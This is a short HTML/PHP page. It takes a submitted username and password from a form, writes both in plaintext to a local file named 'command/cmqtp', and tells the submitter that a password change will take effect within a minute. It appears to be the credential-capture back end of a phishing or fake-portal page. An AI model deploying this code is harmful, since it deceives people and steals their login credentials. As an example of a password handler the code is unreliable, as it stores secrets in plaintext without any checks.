<!DOCTYPE html>
<html>
<body>

<link rel="stylesheet" type="text/css" href="acttheme/meek.css">

<?php
        $Name = "Username:".$_POST['username']."";
        $Pass = "Password:".$_POST['pwd2']."";
        $data = $_POST['username']. PHP_EOL .$_POST['pwd2']. PHP_EOL;
        $file=fopen("command/cmqtp", "w");
        fwrite($file, $data);
        fclose($file);
    ?>
    
    Password change is been processed and will be active within a minute.
    
</body>
</html>    